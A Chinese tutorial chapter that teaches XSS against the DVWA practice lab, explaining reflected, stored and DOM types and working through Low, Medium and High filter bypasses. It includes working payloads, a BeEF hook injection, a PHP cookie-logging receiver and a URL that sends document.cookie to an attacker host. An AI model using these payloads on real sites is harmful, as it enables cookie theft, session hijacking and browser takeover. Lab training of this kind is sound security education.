# 第11章 DVWA实战 - XSS跨站脚本攻击 🎯

## 开篇引入：XSS到底是个啥？🤔

哈喽各位小伙伴！欢迎来到第11章！今天我们要学习的是Web安全领域里鼎鼎大名的"XSS跨站脚本攻击"。听到这个名字是不是感觉很高端？别怕，听完我给你打的比方，你马上就能懂！

想象一下这个场景 🏪：

你去一个商场的公共留言板上写东西。本来留言板是让大家写"今天天气真好"、"某某餐厅好吃"之类正常话的。但是有一天，有个调皮的人在留言板上写了这么一句话：

> "看到这条留言的人，请马上原地跳三下！不跳就会倒霉！"

结果呢，每个走到留言板前看留言的人，都乖乖地跳了三下。你说搞笑不搞笑？

当然啦，现实中大家可能不会这么傻，但是浏览器会！😆

XSS攻击就跟这个差不多——攻击者往网页里"塞"了一段恶意的JavaScript代码，其他用户访问这个网页的时候，浏览器看到这段代码，就会老老实实地执行它。就像大家看到留言板上的"指令"就去跳三下一样！

举个更具体的例子 👇：

假设你做了一个个人博客网站，允许游客在文章下面留言。有一天，一个攻击者在你的留言框里输入了：
```
<script>alert('你被攻击了！')</script>
```

如果你没有做任何防护，直接把这条留言存到数据库里，然后每次有人打开这篇文章，这条留言就会被显示出来——同时，那段`<script>`标签里的代码也会被执行！于是每个看文章的人都会看到一个弹窗，写着"你被攻击了！"

这就是XSS！是不是一下子就懂了？😎

在这一章里，我们会用DVWA靶场来实战练习XSS攻击，从最简单的Low级别一路打到Impossible级别，让你彻底搞懂XSS的原理和防御方法。准备好了吗？让我们出发吧！🚀

---

## XSS原理大白话 📚

### 什么是XSS？

XSS的全称是Cross-Site Scripting（跨站脚本攻击）。哎？为啥缩写是XSS不是CSS呢？因为CSS已经被"层叠样式表"占用了呀，所以就用X来代替Cross，叫XSS了。

用大白话讲，XSS的原理就是：

> **攻击者往Web页面里插入恶意的JavaScript代码，当其他用户浏览该页面时，这些恶意代码就会在用户的浏览器中执行，从而达到攻击的目的。**

### 为什么会有XSS漏洞？

核心原因就一句话：**用户输入没有经过过滤，直接输出到了页面上。**

打个比方 🎨：

你家有面墙，你允许别人在墙上画画。本来大家都画正常的画儿，但是有个坏人画了个"机关"——谁看到这个机关，谁就得乖乖听他指挥。

为啥坏人能得逞？因为你没有"审核"大家画的内容，直接就让画往墙上贴了。

放到网页里也是一样的道理：
- 用户输入了一段包含`<script>`的内容
- 网站没有检查这段内容有没有问题
- 网站直接把这段内容显示在页面上
- 浏览器看到`<script>`标签，以为是网站自己写的脚本，就执行了

就这么简单！💡

### XSS的危害有多大？

你可能会想：不就是弹个窗吗？有啥大不了的？

千万别小看XSS！弹窗只是最最简单的演示。实际上，通过XSS，攻击者可以做到很多可怕的事情：

- 🍪 **偷取你的Cookie**：偷偷获取你的登录凭证，然后冒充你登录账号
- 🎣 **钓鱼攻击**：伪造一个登录框，骗你输入用户名密码
- 🐴 **挂马**：让你下载病毒木马
- ⌨️ **键盘记录**：记录你在网页上敲的所有内容
- 📝 **篡改网页**：把网页内容改成乱七八糟的东西
- 🔗 **跳转到恶意网站**：把你重定向到诈骗网站

是不是有点后怕了？所以XSS虽然看起来简单，但危害真的不小！

---

## XSS的三种类型 🌈

XSS主要分为三大类，每一类的特点和危害都不太一样。我们一个一个来讲，每个都给你配上生活例子，保证你听完就能分清！

### 1. 反射型XSS（Reflected XSS）💫

**特点：非持久化，需要用户点击特定的URL才会触发。**

啥叫反射型呢？就是恶意代码是"反射"过来的——你发一个请求给服务器，服务器把你请求里的恶意代码又"反射"回页面上了。

生活例子 🏪：

你去商店买东西，跟店员说："我要一个写着'我是笨蛋'的购物袋。"店员就真的给你拿了个写着"我是笨蛋"的袋子。你拿着这个袋子，谁看到袋子上的字，谁就被"攻击"了。

但是注意哦，这个袋子是专门给你一个人的，不会影响其他人。只有你跟店员说了这句话，你才会拿到这个袋子。其他人不这么说，就没事。

反射型XSS就是这样的：
- 恶意代码藏在URL里
- 你访问这个URL，服务器把URL里的内容取出来，放到页面上返回给你
- 只有点击了这个恶意URL的人才会中招
- 换个人访问正常的URL，就啥事没有

**危害程度：中等**（因为需要诱骗用户点击恶意链接）

### 2. 存储型XSS（Stored XSS）💾

**特点：持久化，恶意代码存在数据库里，所有人访问都会中招。**

存储型XSS就厉害了！恶意代码被存到了服务器的数据库里，只要有人访问那个页面，就会被攻击。

生活例子 📋：

还是那个公共留言板。这次有个坏人在留言板上写了"看到这条留言的人请给我100块钱"。然后这条留言被贴在了留言板上，**每个过来看留言板的人都会看到这句话**。

而且，就算坏人走了，留言还在那里。今天来的人能看到，明天来的人也能看到，直到管理员把这条留言删掉为止。

存储型XSS就是这样的：
- 攻击者把恶意代码提交给网站
- 网站把恶意代码存到了数据库里
- 以后每次有人访问相关页面，网站都会从数据库里把恶意代码取出来显示
- 所有访问该页面的用户都会中招

**危害程度：高**（因为不需要诱骗，访问就中招，影响范围大）

### 3. DOM型XSS（DOM Based XSS）🌲

**特点：不经过服务器，完全在浏览器端发生。**

DOM型XSS是三种里面最特殊的一种。它的恶意代码根本不会传到服务器上，完全是在浏览器里"搞事情"。

生活例子 🪞：

你站在一面镜子前面，你对镜子做鬼脸，镜子里的你也对你做鬼脸。这个过程完全是你和镜子之间的互动，跟其他人没关系。

DOM型XSS就是这样的：
- 网页里有一段JavaScript代码，它会从URL里获取某些内容
- 然后这段JS代码把获取到的内容直接插到页面的DOM里
- 整个过程服务器根本不知道，都是浏览器自己干的
- 攻击者就是利用这个过程，在URL里藏恶意代码

**危害程度：中等**（和反射型类似，需要诱骗点击）

### 三种类型对比表 📊

| 类型 | 存储位置 | 是否需要用户点击 | 危害程度 | 常见场景 |
|------|----------|------------------|----------|----------|
| 反射型 | URL里 | 是 | 中等 | 搜索页、错误页 |
| 存储型 | 数据库里 | 否 | 高 | 留言板、评论区 |
| DOM型 | 浏览器端 | 是 | 中等 | 前端路由、页面跳转 |

好啦，三种类型都介绍完了！接下来我们就进入DVWA靶场，一个一个实战体验！🎮

---

### 📍 本章 3 个 XSS 模块 · 三平台访问地址对照（别跑错门！）

DVWA 里 XSS 一共分 **3 个子模块**（反射型 / 存储型 / DOM 型），下面这张表请收藏，打哪个模块就进哪个地址。**尤其是 Docker 版没有 /dvwa 这一层路径，别复制错了！**

| 模块名称（左侧菜单） | 🪟 Windows PHPStudy | 🐧 **Kali Linux LAMP（你在用 ✅ 最推荐）** | 🐳 Docker 版（端口 4280 · 拉不动看 ch04 §4.5/§4.7 ✅） |
|---|---|---|---|
| **XSS (Reflected)** · 反射型（URL 里藏 payload） | `http://localhost/dvwa/vulnerabilities/xss_r/` | `http://你的KaliIP/dvwa/vulnerabilities/xss_r/`<br>例：`http://192.168.42.135/dvwa/vulnerabilities/xss_r/` | `http://你的KaliIP:4280/vulnerabilities/xss_r/` |
| **XSS (Stored)** · 存储型（留言板存数据库） | `http://localhost/dvwa/vulnerabilities/xss_s/` | `http://你的KaliIP/dvwa/vulnerabilities/xss_s/`<br>例：`http://192.168.42.135/dvwa/vulnerabilities/xss_s/` | `http://你的KaliIP:4280/vulnerabilities/xss_s/` |
| **XSS (DOM)** · DOM 型（锚点 # 绕过白名单） | `http://localhost/dvwa/vulnerabilities/xss_d/` | `http://你的KaliIP/dvwa/vulnerabilities/xss_d/`<br>例：`http://192.168.42.135/dvwa/vulnerabilities/xss_d/` | `http://你的KaliIP:4280/vulnerabilities/xss_d/` |
| **Kali 专用利器 🔥** | Burp Suite（手动改包） | **BeEF XSS 框架 + Burp + cookie-editor 插件** | Kali 本机用 Beef + Docker 容器做靶（Docker 拉不动直接用 Kali LAMP ✅） |

> 🔎 **怎么查你 Kali 的 IP？** 打开终端执行：`ip -4 a | grep "inet " | grep -v 127.0.0.1`，输出里那一串 192.168.x.x / 10.x.x.x 就是。

---

### 🗺️ 图 11-1 XSS 三类攻击全景流程图（反射 vs 存储 vs DOM）

下面这张图帮你一眼看清 **三种 XSS 的数据流到底差在哪**——上面是反射型（URL → 服务器 → 受害者），中间是存储型（payload 存进数据库，**所有访问者都中招**），下面是 DOM 型（全程不经过服务器，只在浏览器里作妖）：

<svg viewBox="0 0 1160 620" width="100%" xmlns="http://www.w3.org/2000/svg" style="width:100%;max-width:1020px;margin:18px auto;display:block;border:1px solid #2a2a3a;border-radius:14px;background:#0f1120;">
  <defs>
    <linearGradient id="xss-row1" x1="0" y1="0" x2="1" y2="0"><stop offset="0%" stop-color="#1f6feb"/><stop offset="100%" stop-color="#0b3b8a"/></linearGradient>
    <linearGradient id="xss-row2" x1="0" y1="0" x2="1" y2="0"><stop offset="0%" stop-color="#da3633"/><stop offset="100%" stop-color="#7a1515"/></linearGradient>
    <linearGradient id="xss-row3" x1="0" y1="0" x2="1" y2="0"><stop offset="0%" stop-color="#8957e5"/><stop offset="100%" stop-color="#421f8c"/></linearGradient>
    <linearGradient id="xss-server" x1="0" y1="0" x2="0" y2="1"><stop offset="0%" stop-color="#2a3556"/><stop offset="100%" stop-color="#151a30"/></linearGradient>
    <marker id="xss-ar1" markerWidth="10" markerHeight="10" refX="9" refY="3" orient="auto"><path d="M0,0 L0,6 L9,3 z" fill="#4490ff"/></marker>
    <marker id="xss-ar2" markerWidth="10" markerHeight="10" refX="9" refY="3" orient="auto"><path d="M0,0 L0,6 L9,3 z" fill="#f85149"/></marker>
    <marker id="xss-ar3" markerWidth="10" markerHeight="10" refX="9" refY="3" orient="auto"><path d="M0,0 L0,6 L9,3 z" fill="#a371f7"/></marker>
  </defs>
  <text x="580" y="32" text-anchor="middle" fill="#fff" font-size="20" font-weight="bold" font-family="Arial">图 11-1  XSS 三类攻击全景对比 · 反射型（上） 存储型（中） DOM 型（下）</text>
  <!-- 第一行：反射型 XSS -->
  <g font-family="Arial">
    <rect x="20"  y="54" width="1120" height="158" rx="14" fill="url(#xss-row1)" stroke="#4490ff" stroke-width="1.4"/>
    <text x="84" y="78" fill="#fff" font-weight="bold" font-size="15">💫 ① 反射型 XSS（Reflected）· 点链接才中招</text>
    <!-- 攻击者 -->
    <rect x="40" y="92" width="170" height="106" rx="10" fill="#000" opacity="0.35" stroke="#4490ff"/>
    <text x="125" y="118" text-anchor="middle" fill="#cfe1ff" font-weight="bold">😈 攻击者（Kali 里）</text>
    <text x="52"  y="142" fill="#e6efff" font-size="12">构造恶意 URL：</text>
    <text x="52"  y="162" fill="#ffe16b" font-size="12">/xss_r/?name=&lt;script&gt;steal()&lt;/script&gt;</text>
    <text x="52"  y="184" fill="#a0c4ff" font-size="12">→ 发邮件 / 发聊天链接骗用户点</text>
    <!-- 箭头 -->
    <line x1="210" y1="145" x2="300" y2="145" stroke="#4490ff" stroke-width="2" marker-end="url(#xss-ar1)"/>
    <text x="255" y="138" text-anchor="middle" fill="#a0c4ff" font-size="11">① 点链接</text>
    <!-- 受害者浏览器 -->
    <rect x="302" y="92" width="200" height="106" rx="10" fill="#000" opacity="0.35" stroke="#4490ff"/>
    <text x="402" y="118" text-anchor="middle" fill="#cfe1ff" font-weight="bold">🧑‍💻 受害者浏览器</text>
    <text x="316" y="142" fill="#e6efff" font-size="12">请求 URL（带 payload）</text>
    <line x1="502" y1="125" x2="582" y2="125" stroke="#4490ff" stroke-width="2" marker-end="url(#xss-ar1)"/>
    <text x="542" y="118" text-anchor="middle" fill="#a0c4ff" font-size="11">② 发请求</text>
    <!-- 服务器 -->
    <rect x="584" y="92" width="220" height="106" rx="10" fill="url(#xss-server)" stroke="#4c5a8a"/>
    <text x="694" y="118" text-anchor="middle" fill="#cfe1ff" font-weight="bold">🖥️ DVWA 服务器(Apache+PHP)</text>
    <text x="596" y="142" fill="#e6efff" font-size="12">直接把 name 参数拼到 HTML 里</text>
    <text x="596" y="162" fill="#ffe16b" font-size="12">echo "Hello ".$_GET['name'];</text>
    <text x="596" y="184" fill="#ff9898" font-size="12">❌ 没过滤！原样返回</text>
    <line x1="584" y1="168" x2="502" y2="168" stroke="#ff9898" stroke-width="2" marker-end="url(#xss-ar1)"/>
    <text x="542" y="182" text-anchor="middle" fill="#ff9898" font-size="11">③ 返回含 script 的 HTML</text>
    <!-- 返回受害者：执行脚本 -->
    <line x1="302" y1="168" x2="212" y2="168" stroke="#ff6b6b" stroke-width="2.2" marker-end="url(#xss-ar1)" stroke-dasharray="5 4"/>
    <text x="255" y="195" text-anchor="middle" fill="#ff6b6b" font-size="11">④ 浏览器执行 → Cookie 被偷 🍪</text>
  </g>
  <!-- 第二行：存储型 XSS -->
  <g font-family="Arial">
    <rect x="20"  y="226" width="1120" height="158" rx="14" fill="url(#xss-row2)" stroke="#ff6b6b" stroke-width="1.4"/>
    <text x="84" y="250" fill="#fff" font-weight="bold" font-size="15">💾 ② 存储型 XSS（Stored）· 一次注入，永久伤害 ⚠️ 危害最高</text>
    <rect x="40" y="264" width="170" height="106" rx="10" fill="#000" opacity="0.35" stroke="#f85149"/>
    <text x="125" y="290" text-anchor="middle" fill="#ffd7d7" font-weight="bold">😈 攻击者（Kali 留言）</text>
    <text x="52"  y="314" fill="#ffeaea" font-size="12">在 DVWA 留言板提交：</text>
    <text x="52"  y="334" fill="#ffe16b" font-size="12">&lt;img src=x onerror=steal()&gt;</text>
    <text x="52"  y="356" fill="#ffb0b0" font-size="12">存入数据库（guestbook 表）💥</text>
    <line x1="210" y1="314" x2="300" y2="314" stroke="#f85149" stroke-width="2" marker-end="url(#xss-ar2)"/>
    <text x="255" y="307" text-anchor="middle" fill="#ffb0b0" font-size="11">① POST 留言</text>
    <rect x="302" y="264" width="220" height="106" rx="10" fill="url(#xss-server)" stroke="#4c5a8a"/>
    <text x="412" y="290" text-anchor="middle" fill="#ffd7d7" font-weight="bold">🖥️ DVWA 服务器(PHP + MySQL)</text>
    <text x="316" y="314" fill="#ffeaea" font-size="12">INSERT 留言进 guestbook 表</text>
    <text x="316" y="334" fill="#ffe16b" font-size="12">❌ 完全没 htmlspecialchars</text>
    <rect x="316" y="344" width="192" height="20" rx="5" fill="#2a0a0a" stroke="#ff6b6b"/>
    <text x="412" y="359" text-anchor="middle" fill="#ffe16b" font-size="12" font-weight="bold">🗄️ MySQL dvwa.guestbook（存死了）</text>
    <line x1="522" y1="314" x2="600" y2="314" stroke="#f85149" stroke-width="2" marker-end="url(#xss-ar2)"/>
    <text x="561" y="307" text-anchor="middle" fill="#ffb0b0" font-size="11">② 以后每次 SELECT</text>
    <rect x="602" y="264" width="200" height="106" rx="10" fill="#000" opacity="0.35" stroke="#f85149"/>
    <text x="702" y="290" text-anchor="middle" fill="#ffd7d7" font-weight="bold">🧑‍💻 任何受害者浏览器</text>
    <text x="616" y="314" fill="#ffeaea" font-size="12">正常打开留言板页面</text>
    <text x="616" y="334" fill="#ffe16b" font-size="12">恶意脚本跟着留言一起显示</text>
    <text x="616" y="356" fill="#ff9898" font-size="12">💥 每个人都自动执行！</text>
    <line x1="802" y1="320" x2="884" y2="320" stroke="#ff6b6b" stroke-width="2.2" marker-end="url(#xss-ar2)" stroke-dasharray="5 4"/>
    <text x="842" y="314" text-anchor="middle" fill="#ff9898" font-size="11">③ Cookie / 键盘记录 / 挂马</text>
    <rect x="886" y="264" width="240" height="106" rx="10" fill="#2a0a0a" stroke="#ff6b6b"/>
    <text x="1006" y="290" text-anchor="middle" fill="#ffd7d7" font-weight="bold">🥩 攻击者 Kali · BeEF 控制台 / XSS 平台</text>
    <text x="898" y="314" fill="#ffeaea" font-size="12">🍪 Cookie 汇总（session 劫持）</text>
    <text x="898" y="334" fill="#ffeaea" font-size="12">⌨️ 键盘记录 / 📸 页面截图</text>
    <text x="898" y="356" fill="#ff9898" font-size="12">🎣 注入钓鱼登录框 · 重定向恶意站</text>
  </g>
  <!-- 第三行：DOM 型 XSS -->
  <g font-family="Arial">
    <rect x="20"  y="398" width="1120" height="204" rx="14" fill="url(#xss-row3)" stroke="#a371f7" stroke-width="1.4"/>
    <text x="84" y="422" fill="#fff" font-weight="bold" font-size="15">🌲 ③ DOM 型 XSS · 服务器根本不知道！(High 用 #锚点 绕过服务端白名单 🔥)</text>
    <rect x="40" y="436" width="230" height="152" rx="10" fill="#000" opacity="0.35" stroke="#a371f7"/>
    <text x="155" y="462" text-anchor="middle" fill="#e3d0ff" font-weight="bold">😈 攻击者构造 URL（关键在 # 锚点）</text>
    <text x="52"  y="490"  fill="#f0e4ff" font-size="12">High 级别（服务端白名单只看 default=English）：</text>
    <text x="52"  y="512"  fill="#ffe16b" font-size="12">?default=English#&lt;/option&gt;&lt;img src=x onerror=alert(1)&gt;</text>
    <rect x="52" y="522" width="206" height="56" rx="6" fill="#1a0b40" stroke="#a371f7"/>
    <text x="68"  y="544" fill="#9effa0" font-size="12" font-weight="bold">✅ 服务端检查通过（default=English 白名单）</text>
    <text x="68"  y="566" fill="#ffb8ff" font-size="12">⚠️ # 后面的内容 不会发到服务器！</text>
    <line x1="270" y1="480" x2="350" y2="480" stroke="#a371f7" stroke-width="2" marker-end="url(#xss-ar3)"/>
    <text x="310" y="473" text-anchor="middle" fill="#e3d0ff" font-size="11">受害者点击</text>
    <rect x="352" y="436" width="300" height="152" rx="10" fill="url(#xss-server)" stroke="#4c5a8a"/>
    <text x="502" y="462" text-anchor="middle" fill="#e3d0ff" font-weight="bold">🖥️ DVWA 服务器 —— 全程一脸懵 🤷</text>
    <text x="366" y="490" fill="#f0e4ff" font-size="12">服务端 $_GET 只拿到 default=English</text>
    <rect x="366" y="500" width="272" height="28" rx="6" fill="#0e4a1c" stroke="#3fb950"/>
    <text x="502" y="520" text-anchor="middle" fill="#9effa0" font-size="13" font-weight="bold">✅ 白名单校验通过 · switch case English</text>
    <text x="366" y="560" fill="#f0e4ff" font-size="12">服务器只返回正常 HTML + 原始 JS 代码</text>
    <text x="366" y="580" fill="#ff9eff" font-size="12">🔒 #锚点里的恶意内容 · 服务器完全没看到！</text>
    <line x1="652" y1="510" x2="730" y2="510" stroke="#a371f7" stroke-width="2" marker-end="url(#xss-ar3)"/>
    <text x="691" y="503" text-anchor="middle" fill="#e3d0ff" font-size="11">返回静态 HTML+JS</text>
    <rect x="732" y="436" width="280" height="152" rx="10" fill="#000" opacity="0.35" stroke="#a371f7"/>
    <text x="872" y="462" text-anchor="middle" fill="#e3d0ff" font-weight="bold">🧑‍💻 受害者浏览器（真正出事的地方 💥）</text>
    <text x="746" y="486" fill="#f0e4ff" font-size="12">① 前端 JS 读取完整 URL（含#锚点）：</text>
    <text x="746" y="506" fill="#ffe16b" font-size="12">document.location.href 里是完整的 payload！</text>
    <text x="746" y="528" fill="#f0e4ff" font-size="12">② JS 取 substring 拼到 document.write()：</text>
    <text x="746" y="548" fill="#ff9eff" font-size="12">lang = URL.substring(indexOf("default=")+8)</text>
    <text x="746" y="570" fill="#ff6bff" font-size="12" font-weight="bold">💥 &lt;/option&gt;闭合 + &lt;img onerror&gt; 成功执行！</text>
    <line x1="1012" y1="510" x2="1094" y2="510" stroke="#ff6bff" stroke-width="2.2" marker-end="url(#xss-ar3)" stroke-dasharray="5 4"/>
    <text x="1054" y="503" text-anchor="middle" fill="#ff9eff" font-size="11">发回 Kali · Beef 控制</text>
  </g>
</svg>

---

### 🔥 Kali 同学本章速查（BeEF + Cookie 劫持 · 直接复制改 IP）

在 Kali 里玩 XSS，**弹窗（alert）只是新手玩具**，真正的玩法是把受害者勾进 **BeEF XSS 控制框架**（Kali 官方预装的），或者把 Cookie 发到你自己的接收端。下面两条命令直接上：

#### ① 启动 BeEF（XSS 控制平台 · Kali 自带）

```bash
# Kali 默认已安装 beef-xss；没有就先装
sudo apt install -y beef-xss

# 启动 BeEF（首次会让你改 beef 用户密码，记下来）
sudo beef-xss

# 启动后看控制台输出：
#   管理界面（你自己打开）：http://127.0.0.1:3000/ui/panel
#   Hook 脚本（给受害者执行）：http://你的KaliIP:3000/hook.js
#   登录账号：beef / 你刚才设的密码
```

#### ② DVWA 注入 BeEF Hook（让受害者自动被你控制 👻）

把下面 payload 贴进 **DVWA XSS (Stored) 留言板 Message 框（Low 难度）**，以后每个打开留言板的人都会进你的 BeEF 僵尸网络：

```html
<script src="http://192.168.42.135:3000/hook.js"></script>
```

> ⚠️ 把 `192.168.42.135` 改成你 Kali 自己的 IP！

#### ③ 最朴素的 Cookie 收信脚本（10 行 PHP，Kali Apache 直接跑）

不想搭 Beef？用下面这个极简方案：

```bash
# 1. Kali 里建一个接收脚本
sudo mkdir -p /var/www/html/xss/
sudo tee /var/www/html/xss/steal.php << 'EOF'
<?php
if (isset($_GET['c'])) {
    $line = date("Y-m-d H:i:s") . " | " . $_SERVER['REMOTE_ADDR'] . " | " . $_GET['c'] . PHP_EOL;
    file_put_contents("/var/www/html/xss/cookies.log", $line, FILE_APPEND);
}
header("Content-Type: image/gif");
echo base64_decode("R0lGODlhAQABAIAAAP///wAAACH5BAEAAAEALAAAAAABAAEAAAICTAEAOw==");
EOF
sudo chown -R www-data:www-data /var/www/html/xss/
sudo chmod -R 775 /var/www/html/xss/

# 2. 确认 Apache 开着
sudo systemctl start apache2

# 3. 查看被偷的 Cookie
tail -f /var/www/html/xss/cookies.log
```

#### ④ 贴进 DVWA 的 payload（XSS Reflected Low 示例）

```
http://192.168.42.135/dvwa/vulnerabilities/xss_r/?name=<img src=x onerror="this.src='http://192.168.42.135/xss/steal.php?c='+document.cookie">
```

> ✅ **Docker 同学注意：** 如果你的 DVWA 是 `docker run -p 4280:80` 拉起的，把上面 URL 里的 `/dvwa/vulnerabilities/xss_r/` 改成 `:4280/vulnerabilities/xss_r/`，其他 payload 一模一样。

---

## 反射型XSS实战（Reflected XSS）🎯

好的，现在我们打开DVWA，选择"XSS (Reflected)"模块，开始我们的反射型XSS之旅！

### Low级别 - 最简单的开始 🟢

首先把DVWA的安全级别调到Low，然后进入XSS (Reflected) 页面。

#### 看看页面长啥样

一进去你会看到一个输入框，上面写着"What's your name?"（你叫什么名字？），旁边有个Submit按钮。

你试着输入你的名字，比如"小明"，然后点提交。页面上就会显示"Hello 小明"。

嗯，功能很简单：你输入名字，它跟你打个招呼。

#### 第一次尝试XSS攻击

那我们来试试，输入点不一样的东西。在输入框里输入：

```html
<script>alert(1)</script>
```

然后点提交！

哇！弹窗了！🎉 弹出了一个写着"1"的对话框。

恭喜你！你的第一个XSS攻击成功了！😎

#### 为啥会这样？

我们来分析一下。当你输入`<script>alert(1)</script>`的时候：

1. 浏览器把这段内容发送给服务器
2. 服务器收到后，直接把它拼接到返回的HTML里，大概是这样的：
   ```html
   <pre>Hello <script>alert(1)</script></pre>
   ```
3. 浏览器收到HTML后，看到`<script>`标签，就执行了里面的`alert(1)`
4. 然后就弹窗啦！

就这么简单！因为Low级别完全没有任何过滤，你输入啥它就输出啥。

#### 源代码分析

我们来看看Low级别的源代码，验证一下我们的想法：

```php
<?php

header ("X-XSS-Protection: 0");

// Is there any input?
if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
    // Feedback for end user
    echo '<pre>Hello ' . $_GET[ 'name' ] . '</pre>';
}

?>
```

看到了吗？关键就是这一行：
```php
echo '<pre>Hello ' . $_GET[ 'name' ] . '</pre>';
```

它直接把用户通过GET方式传过来的`name`参数，原封不动地输出到了页面上。连检查都不检查一下！

这就是典型的XSS漏洞——用户输入未经过滤直接输出。 💡

> 💡 小知识：你注意到URL变化了吗？提交后URL变成了类似`.../?name=<script>alert(1)</script>`这样的。这就是反射型XSS的特点——恶意代码在URL里！你把这个URL发给别人，别人点开也会弹窗哦！

---

### Medium级别 - 开始有点意思了 🟡

好的，现在我们把安全级别调到Medium，再来试试。

#### 第一次尝试：老办法还行吗？

还是输入`<script>alert(1)</script>`，点提交。

哎？这次没有弹窗了！页面上显示的是"Hello"，后面啥都没有。

咋回事？我们来看看页面源码。哦，原来`<script>`标签被删掉了！所以只剩个"Hello "。

看来Medium级别做了点过滤——它把`<script>`标签给过滤掉了。

#### 绕过思路：怎么对付过滤？

敌人有了防御，我们就得想办法绕过去。过滤`<script>`标签？没问题，我们有N种绕过方法！

**方法一：大小写混合 🔠**

程序员写过滤的时候，有时候只会过滤小写的`<script>`。那我们用大写的`<SCRIPT>`行不行？

来试试，输入：
```html
<SCRIPT>alert(1)</SCRIPT>
```

提交！

哇！又弹窗了！🎉 成功绕过！

为啥能成功？因为HTML标签是不区分大小写的，`<SCRIPT>`和`<script>`在浏览器眼里是一样的。但是如果过滤代码只找小写的，那就被我们钻空子了！

**方法二：双写绕过 📝**

还有一种思路：如果程序是把`<script>`替换成空字符串，那我们能不能在`<script>`中间再插一个`<script>`？

比如写成：
```html
<scr<script>ipt>alert(1)</scr<script>ipt>
```

你看，中间那个`<script>`会被删掉，剩下的部分拼起来又是一个完整的`<script>`标签！是不是很聪明？😏

当然，在Medium级别里，大小写混合已经能成功了，这个方法可能用不上。但是思路你要记住，以后说不定能用上！

**方法三：用其他标签 🏷️**

就算`<script>`标签被彻底封死了，我们还有很多其他标签可以用！

比如`<img>`标签：
```html
<img src=x onerror=alert(1)>
```

这是什么意思呢？我们来解释一下：
- `<img>`是图片标签，`src`属性指定图片地址
- 我们把`src`设为`x`，这是一个不存在的地址
- `onerror`是一个事件，当图片加载失败时就会执行
- 所以图片加载失败的时候，就会执行`alert(1)`

聪明吧？不需要`<script>`标签照样能执行JS代码！

来试试，肯定也能成功！🎉

类似的标签还有很多，比如：
```html
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<svg onload=alert(1)>
```

这些都可以！XSS的绕过姿势千奇百怪，以后你会学到更多！

#### 源代码分析

我们来看看Medium级别的源代码，看看它到底是怎么过滤的：

```php
<?php

header ("X-XSS-Protection: 0");

// Is there any input?
if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
    // Get input
    $name = str_replace( '<script>', '', $_GET[ 'name' ] );

    // Feedback for end user
    echo "<pre>Hello ${name}</pre>";
}

?>
```

看到关键代码了吗？
```php
$name = str_replace( '<script>', '', $_GET[ 'name' ] );
```

它用了`str_replace`函数，把字符串里的`<script>`替换成空字符串。

这个过滤有啥问题呢？
- 只过滤小写的`<script>`，大写的`<SCRIPT>`不管
- 只替换一次，双写就能绕过

所以我们的大小写混合绕过法能成功，就是这个原因！

---

### High级别 - 更严格的过滤 🔴

好，现在我们把难度调到High，继续挑战！

#### 试试之前的方法

先来试试`<SCRIPT>alert(1)</SCRIPT>`——不行。

再试试`<img src=x onerror=alert(1)>`——哎？这个好像可以？还是也不行？

别急，我们来看看High级别的源代码，知己知彼才能百战百胜嘛！

#### 源代码分析

```php
<?php

header ("X-XSS-Protection: 0");

// Is there any input?
if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
    // Get input
    $name = preg_replace( '/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $_GET[ 'name' ] );

    // Feedback for end user
    echo "<pre>Hello ${name}</pre>";
}

?>
```

哇，这次用了正则表达式！`preg_replace`函数，模式是`/ <(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t /i`。

我们来解读一下这个正则：
- `<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t` - 匹配以`<`开头，中间依次有s、c、r、i、p、t这些字母的内容
- 最后的`/i`表示不区分大小写

也就是说，不管你怎么写，只要标签里有script这几个字母（中间可以插其他东西），都会被过滤掉！大小写混合、双写，都没用了！

#### 怎么绕过？

那怎么办呢？别急，我们还有其他标签可用啊！正则只过滤了带script的标签，其他标签它可没管！

比如我们的老朋友`<img>`标签：
```html
<img src=x onerror=alert(1)>
```

这个里面没有script字样吧？所以不会被过滤！

来试试，输入上面这段代码，提交！

成功！又弹窗了！🎉

还有很多其他标签和事件可以用，比如：
```html
<body onload=alert(1)>
<svg onload=alert(1)>
<input onfocus=alert(1) autofocus>
```

这些都可以！因为它们都不包含"script"这个单词，所以正则不会匹配到。

> 💡 小知识：你看，只过滤`<script>`标签是远远不够的！HTML里能执行JavaScript的地方太多了，各种标签的事件属性都可以。所以防御XSS不能靠黑名单，得用更可靠的方法——这个我们后面讲防御的时候再说。

### ✅ 表 11-1 · 反射型 XSS（Reflected XSS）Low/Medium/High 三级通关速查 & 失败对照表

三种级别都是同一个输入框（What's your name? 提交 GET 参数 `name=`），一个接一个按下面 payload 测。**注意：Chrome 自带 XSS Auditor（老版本）/CSP 可能拦截弹窗 → 测试前一定换 Firefox 或 Chrome 开无痕 + 禁用 `chrome://flags/#enable-webui-xss-auditor` 或直接用 alert(document.domain) 试**

| 难度 | 先干什么 | name 输入框里填什么（**逐字抄！标点符号英文！**） | 看到什么算这级通过 ✅ | **失败了怎么办？（按报错抄作业）** ❌ |
|---|---|---|---|---|
| 🟢 Low | 切难度到 low → Submit → 刷新 → 进入 XSS (Reflected) | ① 最简单经典：`<script>alert('XSS_Low_OK_'+document.cookie)</script>`（**注意 script 全小写，前后尖括号英文输入法！**）→ Submit | 浏览器弹弹窗，内容是 `XSS_Low_OK_PHPSESSID=...security=low` = Low 通过 ✅ | 【点 Submit 后页面显示 `Hello <script>alert(...) </script>` 没有弹窗！】→ 99% 新手踩坑：① 你用了中文尖括号 `＜script＞` 不是英文 `<script>`；② 浏览器 XSS Auditor 拦了 → 用 Firefox 测 / 或写 `<body onload=alert(1)>` 这种 Auditor 不拦的事件属性；③ CSP 拦截（控制台 F12 Console 报 Refused to execute inline script because it violates the following Content Security Policy directive）→ 这种情况用 `<img src=x onerror=alert(1)>` 有时能过，实在不行改靶场 Apache 响应头去掉 CSP |
